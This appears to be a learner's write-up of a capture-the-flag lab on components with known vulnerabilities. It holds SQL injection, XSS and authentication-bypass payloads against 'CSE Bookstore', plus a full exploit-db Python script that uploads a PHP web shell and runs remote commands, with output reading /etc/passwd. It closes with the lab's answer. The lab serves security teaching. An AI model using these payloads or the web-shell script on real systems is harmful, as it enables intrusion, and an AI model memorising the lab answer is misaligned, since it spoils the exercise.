#Components With Known Vulnerabilities
----------------------------------------------------
#Introduction

Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.
For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on exploit-db. ( https://www.exploit-db.com/exploits/41962 )
As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.
Hence, why OWASP has rated this a 3(meaning high) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.
----------------------------------------------------
#Exploit

Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software, and research it until we can find an exploit. Let's go through that with an example web application.
What do you know, this server is using the default page for the nostromo web server. Now that we have a version number and a software name, we can use exploit-db to try and find an exploit for this particular version.
(Note: exploit-db is incredibly useful, and for all you beginners you're gonna be using this a lot so it's best to get comfortable with it)
Lucky us, the top result happens to be an exploit script. Let's download it and try and to get code execution. Running this script on it's own actually teaches us a very important lesson.

It may not work the first time. It helps to have an understanding of the programming language that the script is in, so that if needed you can fix any bugs or make any modifications, as quite a few scripts on exploit-db expect you to make modifications.

Now it's important to note here that most scripts will just tell you what arguments you need to provide, exploit developers will rarely make you read potentially hundreds of lines of codes just to figure out how to use the script.

It is also worth noting that it may not always be this easy, sometimes you will just be given a version number like in this case, but other times you may need to dig through the HTML source, or even take a lucky guess on an exploit script, but realistically if it is a known vulnerability, there's probably a way to discover what version the application is running.

That's really it, the great thing about this piece of the OWASP 10, is that the work is pretty much already done for us, we just need to do some basic research, and as a penetration tester, you're already doing that quite a bit :).
----------------------------------------------------
#Lab
The following is a vulnerable application, all information you need to exploit it can be found online. 

Note: When you find the exploit script, put all of your input in quotes, for example "id"

--> Lab Description
CSE Boostore
PHP with MYSQL
Has admin login page, publisher_list, books, contact and a cart

Searching CSE Bookstore on https://www.exploit-db.com/ gave a list of 3 exploits.
(None of them are verified. Used too much time in making this work, without proper idea of the payloads.)

1. CSE Bookstore 1.0 - Multiple SQL Injection (https://www.exploit-db.com/exploits/49314)

1.1 Payload: http://192.168.196.83:80/ebook/bookPerPub.php?pubid=' OR NOT 4138=4138#
In our case, http://10.10.88.197/book.php?bookisbn=978-0-321-94786-4

1.1.1 So, the payload, http://10.10.88.197/book.php?bookisbn=' OR NOT 4138=4138#
Response: Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1

1.1.2 So, the payload, http://10.10.88.197/book.php?bookisbn=" OR NOT 4138=4138#
Response: Empty book


1.2 Payload: http://192.168.196.83:80/ebook/bookPerPub.php?pubid=' OR (SELECT 7393 FROM(SELECT COUNT(*),CONCAT(0x71717a7071,(SELECT (ELT(7393=7393,1))),0x7178716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nkDF
In our case, http://10.10.88.197/book.php?bookisbn=978-0-321-94786-4

1.2.1 So, the payload, http://10.10.88.197/book.php?bookisbn=' OR (SELECT 7393 FROM(SELECT COUNT(*),CONCAT(0x71717a7071,(SELECT (ELT(7393=7393,1))),0x7178716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nkDF
Response: Can't retrieve data Duplicate entry 'qqzpq1qxqjq1' for key ''

1.2.2 So, the payload, http://10.10.88.197/book.php?bookisbn=" OR (SELECT 7393 FROM(SELECT COUNT(*),CONCAT(0x71717a7071,(SELECT (ELT(7393=7393,1))),0x7178716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nkDF
Response: Empty book


2. CSE Bookstore 1.0 - 'quantity' Persistent Cross-site Scripting (https://www.exploit-db.com/exploits/48973)

Payload: 
    "><svg/onload=alert(5)>

Putting this in the quantity section of the cart page, gives us alert 5. Showing XSS is posssible

3. CSE Bookstore 1.0 - Authentication Bypass (https://www.exploit-db.com/exploits/48960)

Payload: 
    Name: admin
    Pass: %' or '1'='1

This does grant us login into admin when used on the admin login page.


Upon Seraching online book store on https://www.exploit-db.com/ gave a list of these exploits.

    Date	                Title	Type	Platform	Author
    2020-08-31				Online Book Store 1.0 - 'id' SQL Injection	WebApps	PHP	Moaaz Taha
    2020-01-16				Online Book Store 1.0 - Arbitrary File Upload	WebApps	PHP	Or4nG.M4N
    2020-01-15				Online Book Store 1.0 - 'bookisbn' SQL Injection	WebApps	PHP	Ertebat Gostar Co
    2020-01-08				Online Book Store 1.0 - Unauthenticated Remote Code Execution	WebApps	PHP	Tib3rius
    2011-10-03				GotoCode Online Bookstore - Multiple Vulnerabilities	WebApps	ASP	Nathaniel Carew

Out of them, the following is verified, and for the flag, we would need to execute some code on the victim machine.
    2020-01-08				Online Book Store 1.0 - Unauthenticated Remote Code Execution	WebApps	PHP	Tib3rius
https://www.exploit-db.com/exploits/47887

Upon looking at the code (python):
----------------------------------------------------
    import argparse
    import random
    import requests
    import string
    import sys

    parser = argparse.ArgumentParser()
    parser.add_argument('url', action='store', help='The URL of the target.')
    args = parser.parse_args()

    url = args.url.rstrip('/')
    random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

    payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

    file = {'image': (random_file + '.php', payload, 'text/php')}
    print('> Attempting to upload PHP web shell...')
    r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
    print('> Verifying shell upload...')
    r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)

    if random_file in r.text:
        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
        print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
        launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
        if launch_shell.lower() == 'y':
            while True:
                cmd = str(input('RCE $ '))
                if cmd == 'exit':
                    sys.exit(0)
                r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
                print(r.text)
    else:
        if r.status_code == 200:
            print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
        else:
            print('> Web shell failed to upload! The web server may not have write permissions.')
----------------------------------------------------
The code takes input as the URL to the website and manages to perform everything by itself.

Ran the code using: python3 47887.py http://10.10.88.197/

Output:

    > Attempting to upload PHP web shell...
    > Verifying shell upload...
    > Web shell uploaded to http://10.10.88.197/bootstrap/img/PZU9Gz9EVs.php
    > Example command usage: http://10.10.88.197/bootstrap/img/PZU9Gz9EVs.php?cmd=whoami
    > Do you wish to launch a shell here? (y/n): y
    RCE $ whoami
    www-data

    RCE $ pwd
    /var/www/html/bootstrap/img

    RCE $ wc -c /etc/passwd
    1611 /etc/passwd

    RCE $

-->

- How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
-- 1611